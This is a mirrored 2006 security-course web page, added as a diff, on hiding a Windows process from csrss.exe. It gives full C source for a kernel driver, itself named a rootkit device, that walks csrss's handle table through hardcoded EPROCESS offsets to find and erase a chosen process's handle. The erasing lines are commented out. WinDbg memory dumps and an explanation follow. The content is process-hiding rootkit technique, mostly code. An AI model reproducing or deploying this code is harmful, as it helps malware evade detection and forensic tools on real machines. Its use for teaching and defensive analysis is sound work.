@@ -1,0 +1,431 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/hcrss.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:04 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="hcrss_files/filelist.html">
+<title>Each time we create a process the eprocess address is stored within
+csrss</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Vijay Mukhi</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>44</o:TotalTime>
+  <o:Created>2006-06-26T11:57:00Z</o:Created>
+  <o:LastSaved>2006-06-26T11:57:00Z</o:LastSaved>
+  <o:Pages>4</o:Pages>
+  <o:Words>935</o:Words>
+  <o:Characters>5331</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>44</o:Lines>
+  <o:Paragraphs>10</o:Paragraphs>
+  <o:CharactersWithSpaces>6546</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>Hiding from crss</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Each time we create a process the eprocess address is stored
+within csrss.exe. Lets now remove our process id from csrss.exe.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>r.c</p>
+
+<p class=MsoNormal>#include &lt;ntddk.h&gt;</p>
+
+<p class=MsoNormal>#include &lt;stdio.h&gt;</p>
+
+<p class=MsoNormal>const WCHAR deviceLinkBuffer[]<span style="mso-spacerun:
+yes">  </span>= L&quot;\\DosDevices\\sonal9&quot;;</p>
+
+<p class=MsoNormal>const WCHAR deviceNameBuffer[]<span style="mso-spacerun:
+yes">  </span>= L&quot;\\Device\\sonal9&quot;;</p>
+
+<p class=MsoNormal>UNICODE_STRING
+deviceNameUnicodeString,deviceLinkUnicodeString;<span style="mso-spacerun:
+yes">        </span></p>
+
+<p class=MsoNormal>PDEVICE_OBJECT g_RootkitDevice;</p>
+
+<p class=MsoNormal>typedef struct _TABLE_ENTRY </p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>long object;</p>
+
+<p class=MsoNormal>ACCESS_MASK security;</p>
+
+<p class=MsoNormal>} TABLE_ENTRY, *PTABLE_ENTRY, **PPTABLE_ENTRY,
+***PPPTABLE_ENTRY;</p>
+
+<p class=MsoNormal>long FindProcessEPROCByName(char *p_name)</p>
+
+<p class=MsoNormal>{ </p>
+
+<p class=MsoNormal>int current_PID,start_PID,len = 0;</p>
+
+<p class=MsoNormal>PLIST_ENTRY plist_active_procs;</p>
+
+<p class=MsoNormal>PEPROCESS eproc;</p>
+
+<p class=MsoNormal>len=strlen(p_name);</p>
+
+<p class=MsoNormal>eproc = PsGetCurrentProcess();</p>
+
+<p class=MsoNormal>start_PID = *((long *)((long)eproc+0x84));</p>
+
+<p class=MsoNormal>current_PID = start_PID;</p>
+
+<p class=MsoNormal>while(1)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>if(_strnicmp(p_name, (PVOID)((long)eproc+0x174) ,len) == 0)</p>
+
+<p class=MsoNormal>return (long)eproc;</p>
+
+<p class=MsoNormal>else</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>plist_active_procs = (LIST_ENTRY *) ((long)eproc+0x88);</p>
+
+<p class=MsoNormal>(long)eproc = (long) plist_active_procs-&gt;Flink;</p>
+
+<p class=MsoNormal>(long)eproc = (long) eproc - 0x88;</p>
+
+<p class=MsoNormal>current_PID = *((long *)((long)eproc+0x84));</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>int EPROCESSHANDLETABLEOFFSET = 0xc4;</p>
+
+<p class=MsoNormal>int HANDLETABLECOUNTOFFSET = 0x3c;</p>
+
+<p class=MsoNormal>void EraseHandle(PEPROCESS csrsseproc, PVOID eproc)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>PTABLE_ENTRY orig_tableEntry,*pp_tableEntry;</p>
+
+<p class=MsoNormal>int a, b, c;</p>
+
+<p class=MsoNormal>int i_numHandles, i_hperPage, i_numTables,i_handle;</p>
+
+<p class=MsoNormal>i_numHandles = *(int*)((*(long *)((long) csrsseproc +
+EPROCESSHANDLETABLEOFFSET)) + HANDLETABLECOUNTOFFSET);</p>
+
+<p class=MsoNormal>orig_tableEntry = (PTABLE_ENTRY)*(long *)((*(long *)((long)
+csrsseproc + EPROCESSHANDLETABLEOFFSET)) + 0);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Hiding %x from %s i_numHandles=%d
+orig_tableEntry=%x&quot;, eproc,
+(long)csrsseproc+0x174,i_numHandles,orig_tableEntry);</p>
+
+<p class=MsoNormal>i_numTables = ((long)orig_tableEntry &amp; 3);</p>
+
+<p class=MsoNormal>i_hperPage = PAGE_SIZE/sizeof(TABLE_ENTRY);<span
+style='mso-tab-count:1'>   </span></p>
+
+<p class=MsoNormal>pp_tableEntry = (PPTABLE_ENTRY)((long)orig_tableEntry &amp;
+0xfffffff8);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;i_numTables=%d i_hperPage=%d
+pp_tableEntry=%x&quot;,i_numTables,i_hperPage,pp_tableEntry);</p>
+
+<p class=MsoNormal>for (a = 0; a &lt; i_hperPage; a++)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DbgPrint(&quot;pp_tableEntry[a]=%x&quot;,pp_tableEntry[a]);</p>
+
+<p class=MsoNormal>if (pp_tableEntry[a] == NULL)</p>
+
+<p class=MsoNormal>break;</p>
+
+<p class=MsoNormal>for (b = 0; b &lt; i_hperPage; b++)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>//DbgPrint(&quot;object=%08x
+%08x&quot;,pp_tableEntry[a][b].object,((pp_tableEntry[a][b].object |
+0x80000000) &amp; 0xfffffff8));</p>
+
+<p class=MsoNormal>if (((pp_tableEntry[a][b].object | 0x80000000) &amp;
+0xfffffff8) == ((long)eproc - 0x18))</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DbgPrint(&quot;crss.exe Handle = %x Object Header %x %x
+Security %x \n&quot;,((a*512)+b)*4, pp_tableEntry[a][b].object &amp;
+0xfffffff8,(int)eproc - 0x18 , pp_tableEntry[a][b].security);</p>
+
+<p class=MsoNormal>//pp_tableEntry[a][b].object = 0;</p>
+
+<p class=MsoNormal>//pp_tableEntry[a][b].security = 0;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>NTSTATUS abcDevice(PDEVICE_OBJECT DeviceObject,PIRP Irp)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>IO_STACK_LOCATION *irpStack;</p>
+
+<p class=MsoNormal>long *inputBuffer;</p>
+
+<p class=MsoNormal>long pid,ioControlCode;</p>
+
+<p class=MsoNormal>void *eproc,*csrsseproc;</p>
+
+<p class=MsoNormal>irpStack = IoGetCurrentIrpStackLocation (Irp);</p>
+
+<p class=MsoNormal>inputBuffer = (long *)Irp-&gt; AssociatedIrp.SystemBuffer;</p>
+
+<p class=MsoNormal>pid = *inputBuffer;</p>
+
+<p class=MsoNormal>ioControlCode = irpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</p>
+
+<p class=MsoNormal>PsLookupProcessByProcessId(pid,&amp;eproc);</p>
+
+<p class=MsoNormal>csrsseproc =
+(PEPROCESS)FindProcessEPROCByName(&quot;CSRSS.EXE\0&quot;);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;eproc=%x pid=%d
+csrsseproc=%x&quot;,eproc,pid,csrsseproc);</p>
+
+<p class=MsoNormal>EraseHandle((PEPROCESS)csrsseproc, (PVOID)eproc);</p>
+
+<p class=MsoNormal>IoCompleteRequest(Irp,IO_NO_INCREMENT);</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;<span style="mso-spacerun: yes">  
+</span></p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>NTSTATUS abcCreate(PDEVICE_OBJECT DeviceObject,PIRP Irp)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DbgPrint(&quot;abcCreate&quot;);</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;<span style="mso-spacerun: yes">  
+</span></p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>VOID OnUnload(PDRIVER_OBJECT DriverObject )</p>
+
+<p class=MsoNormal>{<span style='mso-tab-count:1'>          </span></p>
+
+<p class=MsoNormal>UNICODE_STRING deviceLinkUnicodeString;</p>
+
+<p class=MsoNormal>RtlInitUnicodeString( &amp;deviceLinkUnicodeString,
+deviceLinkBuffer );</p>
+
+<p class=MsoNormal>IoDeleteSymbolicLink( &amp;deviceLinkUnicodeString );</p>
+
+<p class=MsoNormal>IoDeleteDevice(DriverObject-&gt;DeviceObject);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Unload5&quot;);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>NTSTATUS DriverEntry(PDRIVER_OBJECT d,PUNICODE_STRING r)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>d-&gt;DriverUnload<span style="mso-spacerun: yes">  </span>=
+OnUnload; </p>
+
+<p class=MsoNormal>DbgPrint(&quot;DriverEntry&quot;);</p>
+
+<p class=MsoNormal>RtlInitUnicodeString
+(&amp;deviceNameUnicodeString,deviceNameBuffer );</p>
+
+<p class=MsoNormal>RtlInitUnicodeString
+(&amp;deviceLinkUnicodeString,deviceLinkBuffer );</p>
+
+<p class=MsoNormal>IoCreateDevice (d,0,
+&amp;deviceNameUnicodeString,0,0,TRUE,&amp;g_RootkitDevice );</p>
+
+<p class=MsoNormal>IoCreateSymbolicLink (&amp;deviceLinkUnicodeString,
+&amp;deviceNameUnicodeString );</p>
+
+<p class=MsoNormal>d-&gt;MajorFunction[IRP_MJ_CREATE]=abcCreate;</p>
+
+<p class=MsoNormal>d-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]=abcDevice;</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We pass the pid of<span style="mso-spacerun: yes">  </span>a
+program from the command line and we move straight into abcDevice. Here we
+first find the eprocess structure of our pid using the undocumented function
+PsLookupProcessByProcessId. Then we find the eprocess structure of the program
+csrss.exe using our function taken from the futo code. Then we call another
+function EraseHandle that will take the csrss eprocess and the eprocess of the
+pid we are trying to hide.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dt _EPROCESS 898c28b0</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">   </span>+0x0c4
+ObjectTable<span style="mso-spacerun: yes">      </span>:
+0xe17059c0_HANDLE_TABLE</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>On our machine the eprocess address of csrss is 898c28b0 and
+c4 from the start is the offset where the handle table starts. In our case it
+starts at e17059c0. When we go to this location which is the address of the
+handle table of csrss we add an offset of<span style="mso-spacerun: yes"> 
+</span>3c to get at the number of handles.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd 0xe17059c0+0x3c</p>
+
+<p class=MsoNormal>e17059fc<span style="mso-spacerun: yes">  </span>00000276
+00000000 00000000 0001020a</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We see that we have 630 or 0x276 handles open within csrss. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The handle table starts with a address of where the handles
+are stored. Thus we need to display the start of the handle table.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd 0xe17059c0</p>
+
+<p class=MsoNormal>e17059c0<span style="mso-spacerun: yes">  </span>e23f2001
+898c28b0 00000298 00000000</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We can see that the page that contains the handles begins at
+e23f2000and the depth is 1 as the page table has the first 12 bits as 0 and the
+depth of the tables is stored in the first 2 bits.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now lets see what is stored at the page that will tell us
+what other pages contain the actual handles.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd e23f2000</p>
+
+<p class=MsoNormal>e23f2000<span style="mso-spacerun: yes">  </span>e19c3000
+e23f3000 00000000 00000000</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Thus we have two pages to store our handles, they begin at
+e19c3000 and e23f3000. Thus if we go to any of these pages in memory they will
+be full of process and thread handles.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd e19c3000</p>
+
+<p class=MsoNormal>e19c3000<span style="mso-spacerun: yes">  </span>00000000
+fffffffe e1009539 000f0003</p>
+
+<p class=MsoNormal>e19c3010<span style="mso-spacerun: yes">  </span>e15ac279
+00000003 89aa47a3 00100020</p>
+
+<p class=MsoNormal>e19c3020<span style="mso-spacerun: yes">  </span>e15c7531
+000f000f 898bc2b1 001f0fff</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Like the pspcidtable the handles are 8 bytes, the first the
+eprocess and the second the security mask which is non zero most of the time.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>For some reason the eprocess structures stored are 0x18 less
+than the eprocess values. Thus when we compare the values we need to subtract
+0x18 from eprocess and then check the object value after removing the first 12
+bits.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The reason why we subtract 0x18 from the eprocess is because
+0x18 is the size of the structure object_header. We assume that every eprocess
+structure starts with an object _header field which is 0x18 bytes large.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/hcrss.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:05 GMT -->
+</html>
